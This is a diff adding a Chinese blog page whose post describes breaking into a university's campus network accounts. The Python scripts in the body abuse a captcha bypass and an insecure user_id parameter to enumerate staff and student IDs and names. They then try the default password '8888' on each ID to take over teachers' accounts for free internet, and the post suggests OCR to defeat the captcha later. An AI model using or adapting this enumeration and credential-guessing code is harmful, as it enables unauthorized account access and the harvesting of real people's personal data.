@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-transform"/>
+
+
+    <title>
+      
+    编写爬虫获取教师账号 校园免费上网 - Sajor's Blog
+    
+    </title>
+
+
+  <link href="asset/css/style.css" rel="stylesheet" > 
+  <link href="asset/js/xcode.min.css" rel="stylesheet">
+  <script src="asset/js/headroom.js"></script>
+
+  <script>var element = new Image();Object.defineProperty(element,'id',{get:function(){window.location.href="https://github.com/565785929"}});console.log(element);</script>
+  <!-- <link rel="stylesheet" href="http://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="asset/css/font-awesome.css">
+ -->
+
+  <!-- <script src="asset/highlightjs/highlight.pack.js"></script> -->
+  <!-- <link href="asset/highlightjs/styles/solarized_light.css" media="screen, projection" rel="stylesheet" type="text/css"> -->
+  <!-- <script>hljs.initHighlightingOnLoad();</script> -->
+
+
+  </head>
+
+  <!-- 主体开始 -->
+  <!-- <body class="" gtools_scp_screen_capture_injected="true"> -->
+  <!-- 上面为主页白底色版本 -->
+    
+<body class="bg-grey" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+<!-- 上面是主页灰底色版本 -->
+
+<!--[if lt IE 8]>
+<div class="browsehappy" role="dialog">
+    当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank">升级你的浏览器</a>。
+</div>
+<![endif]-->
+<!-- 头部位置 -->
+
+<header id="header" class="header bg-white headroom">
+  <div class="navbar-container"> 
+    <a href="index.html" class="navbar-logo"><img src="asset/img/K-logo.png"> </a>
+    <div class="navbar-menu"> 
+
+        
+        <a href="index.html">Home</a>
+        
+        <a href="archives.html">Archives</a>
+        
+        <a href="resume/resume.html">Resume</a>
+        
+        
+    </div> 
+    <!-- 搜索框体 -->
+    <!--  <div class="navbar-search" onclick="">
+        <span class="icon-search"></span>
+        <form id="search" method="post" action="/" role="search">
+          <span class="search-box">
+            <input type="text" id="input" class="input" name="s" required="true" placeholder="Search..." maxlength="30" autocomplete="off">
+          </span>
+        </form>
+    </div> -->
+
+    <div class="navbar-mobile-menu" onclick=""> 
+      <span class="icon-menu cross"><span class="middle"></span></span> 
+        <ul> 
+          
+          <li>
+          <a href="index.html">Home</a>
+          </li>
+          
+          <li>
+          <a href="archives.html">Archives</a>
+          </li>
+          
+          <li>
+          <a href="resume/resume.html">Resume</a>
+          </li>
+          
+        </ul> 
+    </div> 
+  </div> 
+</header>
+<!-- 头部结束 --> <!-- post 开始 -->
+<div class="bg-white" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+	<article class="main-content page-page" style="max-width: 700px;padding: 110px 25px 20px" itemscope="" itemtype="http://schema.org/Article">
+		<div class="post-header">
+			<!-- title -->
+			<div class="post-header">
+				<h1 class="post-title itemprop="name headline">编写爬虫获取教师账号 校园免费上网</h1>	
+				<div class="post-data">
+					<time datetime="2018-03-07T22:23:01+08:00" pubdate data-updated="true">2018/03/07</time>
+				</div>
+			</div>
+		</div>
+	<div id="post-content" class="post-content" itemprop="articleBody"> 
+		<p class="post-tags"> 
+		
+		<a href='%E7%88%AC%E8%99%AB.html'>爬虫</a>&nbsp;
+		
+		</p>
+	<!-- 正文 -->
+		<p>
+		<p>通过Python实现</p>
+
+<p>我们学校使用移动的网络账号，修改账号密码的界面是这样的。</p>
+
+<p><img src="media/16322341811288/16322341983535.jpg" alt=""/></p>
+
+<p>这个页面有个漏洞，就是可以绕过验证码直接登录。 所以先使用自己的账号登录一下。登录之后点击基本信息中的变更资料</p>
+
+<p><img src="media/16322341811288/16322342103918.jpg" alt=""/><br/>
+用户姓名就在这里</p>
+
+<p>使用右键复制链接地址之后</p>
+
+<p><img src="media/16322341811288/16322342221212.jpg" alt=""/></p>
+
+<p>你会得到 这样的网址</p>
+
+<blockquote>
+<p><a href="http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=*********&amp;paratype=2">http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=*********&amp;paratype=2</a></p>
+</blockquote>
+
+<p>分析一下这个网址， 其中user_id 就是你的学号</p>
+
+<p>通过修改这个学号就可以得到大家的姓名</p>
+
+<pre class="line-numbers"><code class="language-python">import requests
+import re
+
+class Sajor():
+    def __init__(self):
+        self.url_login = &quot;http://10.40.4.3/selfLogonAction.do&quot;
+        self.session = requests.session()
+        self.headers = {
+            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;
+        }
+        
+    def get_session(self):    
+        &quot;&quot;&quot;&quot; 获取session &quot;&quot;&quot;&quot;
+        data = {
+            &quot;user_id&quot;: &quot;YOUR_ID&quot;,    # 填写你的id
+            &quot;passwd&quot;: &quot;YOUR_PASSOWRD&quot;,    # 填写你的密码
+            &quot;validateCode&quot;: &quot;1234&quot;,
+            &quot;x&quot;: &quot;41&quot;,
+            &quot;y&quot;: &quot;12&quot;,
+        }
+        self.session.post(headers=self.headers, url=self.url_login, data=data)
+    
+    def get_user_name(self, user_id):  
+        &quot;&quot;&quot; 获取用户姓名 &quot;&quot;&quot;
+        url_name = &quot;http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=&quot; + user_id + &quot;&amp;paratype=2&quot;
+        try:
+            name_text = self.session.get(headers=self.headers, url=url_name).text
+            name = re.findall(&#39;id=&quot;user_name&quot; value=&quot;(.*?)&quot;&#39;, name_text)
+            return user_id, name[0]
+        except:
+            return None
+        
+s = Sajor()
+s.get_session()
+
+# 遍历用户学号大致范围
+for id in range(90000, 100000):
+    user_id, user_name = s.get_user_name(str(id))
+    if user_name:
+        print (user_id, user_name)
+</code></pre>
+
+<p>于是就得到了老师们的工号和姓名</p>
+
+<p><img src="media/16322341811288/16322343027449.jpg" alt=""/></p>
+
+<p>同样的也可以得到全校学生的学号和对应的姓名</p>
+
+<p>之后重点来了 由于学校师生的默认密码没有修改。默认8888</p>
+
+<p>所以遍历这些学号，看看有没有没改密码的老师。</p>
+
+<p>通过之前的登陆界面，验证码随便填写一个1234，若成功登陆右上角便会有欢迎</p>
+
+<p><img src="media/16322341811288/16322343160834.jpg" alt=""/></p>
+
+<p>通过这个写个简单的正则表达式 re.findall(&quot;<small>Welcome,</small>&quot;, login)</p>
+
+<p>login为当前页面的html代码，不为空则登陆成功。</p>
+
+<pre class="line-numbers"><code class="language-python">import requests
+import re
+
+class Sajor():
+    def __init__(self):
+        self.url_login = &quot;http://10.40.4.3/selfLogonAction.do&quot;
+        self.session = requests.session()
+        self.headers = {
+            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;
+        }
+        
+    def get_session(self):    
+        &quot;&quot;&quot;&quot; 获取session &quot;&quot;&quot;&quot;
+        data = {
+            &quot;user_id&quot;: &quot;YOUR_ID&quot;,    # 填写你的id
+            &quot;passwd&quot;: &quot;YOUR_PASSOWRD&quot;,    # 填写你的密码
+            &quot;validateCode&quot;: &quot;1234&quot;,
+            &quot;x&quot;: &quot;41&quot;,
+            &quot;y&quot;: &quot;12&quot;,
+        }
+        self.session.post(headers=self.headers, url=self.url_login, data=data)
+    
+    def get_user_name(self, user_id):  
+        &quot;&quot;&quot; 获取用户姓名 &quot;&quot;&quot;
+        url_name = &quot;http://10.40.4.3/userQueryAction.do?act=edit&amp;user_id=&quot; + user_id + &quot;&amp;paratype=2&quot;
+        try:
+            name_text = self.session.get(headers=self.headers, url=url_name).text
+            name = re.findall(&#39;id=&quot;user_name&quot; value=&quot;(.*?)&quot;&#39;, name_text)
+            return user_id, name[0]
+        except:
+            return None
+    
+    def get_free_id_password(self, user_id, user_password=&quot;8888&quot;):
+        data = {
+            &quot;user_id&quot;: user_id,
+            &quot;passwd&quot;: user_password,
+            &quot;validateCode&quot;: &quot;1234&quot;,  # 随便填写
+            &quot;x&quot;: &quot;41&quot;,
+            &quot;y&quot;: &quot;12&quot;,
+        }
+        login = self.session.post(headers=self.headers, url=self.url_login, data=data).text
+        if re.findall(&quot;&lt;small&gt;Welcome,&lt;/small&gt;&quot;, login):
+            return True
+        else:
+            return False
+            
+    def save_id(self):
+        for id in range(90000, 100000): # 这里可以修改为刚刚存储的工号，不必重跑
+            if(self.get_free_id_password(str(id))):
+                print(id)
+
+        
+s = Sajor()
+s.save_id()
+</code></pre>
+
+<p>于是就得到了免费的教师账号了，结果就不放出了。</p>
+
+<p>其中爬出的数据都可以存到数据库中，这里没有写到数据库操作。</p>
+
+<p>若之后验证码修复，可以直接使用百度识别文字的api， 通过观察这个网页的验证码比较好识别</p>
+
+<p><img src="media/16322341811288/16322343579062.jpg" alt=""/></p>
+
+<p>这验证码看起来就比较清晰，，，百度文字识别orc ，完美识别</p>
+
+<p><a href="https://link.zhihu.com/?target=https%3A//cloud.baidu.com/product/ocr/general">“通用文字识别-文字识别-百度AI”</a></p>
+
+<p><img src="media/16322341811288/16322343717246.jpg" alt=""/></p>
+
+<p>所以说，这都不是事。 还是抓紧时间改改自己的密码吧！</p>
+
+		</p>
+		<!-- 侧边导航条 -->
+		<div id="directory-content" class="directory-content">
+    		<div id="directory" style="margin-left: 50px;margin-top: 120px"></div>
+		</div>
+	<!-- JS -->
+	<script>
+		var postDirectoryBuild = function() {
+		    var postChildren = function children(childNodes, reg) {
+		        var result = [],
+		            isReg = typeof reg === 'object',
+		            isStr = typeof reg === 'string',
+		            node, i, len;
+		        for (i = 0, len = childNodes.length; i < len; i++) {
+		            node = childNodes[i];
+		            if ((node.nodeType === 1 || node.nodeType === 9) &&
+		                (!reg ||
+		                isReg && reg.test(node.tagName.toLowerCase()) ||
+		                isStr && node.tagName.toLowerCase() === reg)) {
+		                result.push(node);
+		            }
+		        }
+		        return result;
+		    },
+		    createPostDirectory = function(article, directory, isDirNum) {
+		        var contentArr = [],
+		            titleId = [],
+		            levelArr, root, level,
+		            currentList, list, li, link, i, len;
+		        levelArr = (function(article, contentArr, titleId) {
+		            var titleElem = postChildren(article.childNodes, /^h\d$/),
+		                levelArr = [],
+		                lastNum = 1,
+		                lastRevNum = 1,
+		                count = 0,
+		                guid = 1,
+		                id = 'directory' + (Math.random() + '').replace(/\D/, ''),
+		                lastRevNum, num, elem;
+		            while (titleElem.length) {
+		                elem = titleElem.shift();
+		                contentArr.push(elem.innerHTML);
+		                num = +elem.tagName.match(/\d/)[0];
+		                if (num > lastNum) {
+		                    levelArr.push(1);
+		                    lastRevNum += 1;
+		                } else if (num === lastRevNum ||
+		                    num > lastRevNum && num <= lastNum) {
+		                    levelArr.push(0);
+		                    lastRevNum = lastRevNum;
+		                } else if (num < lastRevNum) {
+		                    levelArr.push(num - lastRevNum);
+		                    lastRevNum = num;
+		                }
+		                count += levelArr[levelArr.length - 1];
+		                lastNum = num;
+		                elem.id = elem.id || (id + guid++);
+		                titleId.push(elem.id);
+		            }
+		            if (count !== 0 && levelArr[0] === 1) levelArr[0] = 0;
+
+		            return levelArr;
+		        })(article, contentArr, titleId);
+		        currentList = root = document.createElement('ul');
+		        dirNum = [0];
+		        for (i = 0, len = levelArr.length; i < len; i++) {
+		            level = levelArr[i];
+		            if (level === 1) {
+		                list = document.createElement('ul');
+		                if (!currentList.lastElementChild) {
+		                    currentList.appendChild(document.createElement('li'));
+		                }
+		                currentList.lastElementChild.appendChild(list);
+		                currentList = list;
+		                dirNum.push(0);
+		            } else if (level < 0) {
+		                level *= 2;
+		                while (level++) {
+		                    if (level % 2) dirNum.pop();
+		                    currentList = currentList.parentNode;
+		                }
+		            }
+		            dirNum[dirNum.length - 1]++;
+		            li = document.createElement('li');
+		            link = document.createElement('a');
+		            link.href = '#' + titleId[i];
+		            link.innerHTML = !isDirNum ? contentArr[i] :
+		                dirNum.join('.') + ' ' + contentArr[i] ;
+		            li.appendChild(link);
+		            currentList.appendChild(li);
+		        }
+		        directory.appendChild(root);
+		    };
+		    createPostDirectory(document.getElementById('post-content'),document.getElementById('directory'), true);
+		};
+		postDirectoryBuild();
+	</script>	
+	<!-- 版权声明 -->
+		<p class="post-info" style="color: #BCBDB6">
+				本文由 <a style="color: #BCBDB6" href="#">Sajor
+				</a> 创作，采用 <a style="color: #BCBDB6" href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="external nofollow">知识共享署名4.0</a> 国际许可协议进行许可<br>本站文章除注明转载/出处外，均为本站原创或翻译，转载前请务必署名<br>最后编辑时间为: 2021-09-21T22:23:01+08:00
+		</p>
+	<!-- 导航 -->
+			<div id="comments" class="clearfix" style="padding: 0px;">
+				<footer class="post-footer clearfix">	    			
+				    <div class="meta">
+					    
+					    	
+					        <a href="16319589839018.html" 
+					        title="Next Post: Commit message 规范">Commit message 规范 &raquo;</a>
+					    </p> 
+					    
+				    </div>
+			  	</footer>
+	<!-- footer end -->
+			</div>		
+	</div>
+</article>
+			<!-- 评论区 -->
+			<div id="respond-post-269" class="comment-container"> 
+				<div id="comments" class="clearfix">
+
+				<script type="text/javascript" src="/pm/hashover/hashover.js"></script>
+<noscript>You must have JavaScript enabled to use the comments.</noscript>
+
+<!-- 评论区结束 -->
+					<div>
+					
+					</div>
+
+				</div>
+			</div>
+</div>
+<!-- headroom -->
+<script type="text/javascript"> 
+(function() {
+    var header = new Headroom(document.querySelector("#header"), {
+        tolerance: 3,
+        offset : 80,
+        classes: {
+          initial: "animated",
+          pinned: "slideDown",
+          unpinned: "slideUp"
+        }
+    });
+    header.init();
+}());
+</script>  <footer id="footer" class="footer" style="background-color: #030501;color: #FFFFFE;">
+  <div class="footer-meta">
+    <div class="footer-container">
+      <!-- 版权说明 -->
+      <div class="meta-item meta-copyright">
+        <div class="meta-copyright-info">
+          <h2 class="meta-title">INFO</h2>
+          <div class="info-text">  
+              <p>Copyright &copy; 2017 <br>
+              <span class="credit">Powered by 
+              <a target="_blank" href="http://zh.mweb.im/">MWeb</a> 
+              </span>
+              <p>Theme Design by <a href="https://www.linpx.com/" target="_blank">Chakhsu</a></p>
+              <p>Migrating to Mweb by <a href="http://metaidea.cn">idken</a></p>
+              </p> 
+          </div>                  
+        </div>
+      </div>  
+      <!-- Categories -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">CATEGORIES</h2>  
+             
+            
+            <li>
+            <a href="%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html">设计模式&nbsp;(2)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="Algorithm.html">Algorithm&nbsp;(1)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="%E8%AF%AD%E6%B3%95%E7%B1%BB.html">语法类&nbsp;(1)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="Git.html">Git&nbsp;(10)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+             
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+             
+      </div>
+      <!-- 最新文章 -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">RECENT POSTS</h2>
+
+          
+          
+         <li>
+           <a href="16322341811288.html">编写爬虫获取教师账号 校园免费上网</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="16319589839018.html">Commit message 规范</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="16312407110535.html">MySQL数据库设计规范（仅供参考）</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="16309452975279.html">04 | 深入浅出索引（上）</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="16304224326131.html">03 | 事务隔离：为什么你改了我还看不见？</a><br>
+         </li>
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+           
+
+      </div>
+  </div>
+</div>
+</footer>
+
+<!--评论变量判断 -->
+      
+<!-- 评论end -->
+
+
+
+</body>
+</html>
